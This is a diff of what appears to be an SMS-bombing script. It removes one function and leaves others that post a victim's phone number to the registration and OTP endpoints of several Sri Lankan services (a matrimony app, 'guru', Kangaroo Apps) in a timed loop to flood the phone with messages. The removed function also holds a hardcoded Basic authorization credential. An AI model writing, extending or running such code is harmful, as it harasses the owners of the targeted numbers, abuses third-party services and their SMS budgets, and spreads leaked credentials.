@@ -23,12 +23,6 @@ def guru(num,delay):
     body={'phone':num,'course':'1','sesskey':'','action':'sms_reg'}
     po=post(url,data=body)
     time.sleep(delay)
-def slmat(num,delay):
-    url='https://www.srilankanmatrimony.com/api/1/6'
-    headers={'Authorization':'Basic YWRtaW46bFJxVzZXTlQ=','Content-Type':'application/x-www-form-urlencoded','Host':'www.srilankanmatrimony.com'}
-    data={'Module':'','MatriId':'LKA841313','PackageName':'com.srilankanmatrimony','AppVersionCode':'148','SignalStrength':'','AppVersion':'6.0','EncryptId':'58ceb12be79bde7e7a1b8ca366823fad099ba147','Referrer':'Page3','NetworkType':'WIFI','UniqueId':'','mima':'yes','DeviceVersion':'5.1','DeviceModel':'HUAWEI%20LUA-U22','contactdet':f'%7B%22PriMobileCountryCode%22%3A%22%2B94%22%2C%22PriMobileNo%22%3A%22{num[1:]}%22%2C%22MatriId%22%3A%22LKA841313%22%7D','DevicePlatform':'Android','OutputType':'2','CommunityId':'2007','AppType':'102','CarrierName':'','Gender':'1'}
-    po=post(url,headers=headers,data=data)
-    time.sleep(delay)
 def kangaroo(num,delay):
     url='https://customer.kangarooapps.com/customer-api/customers/create'
     body={'email':'a1@slt.net','firstName':'A','lastName':'b','password':'abcd1234','contactNumber':num[1:],'countryCode':'+94'}
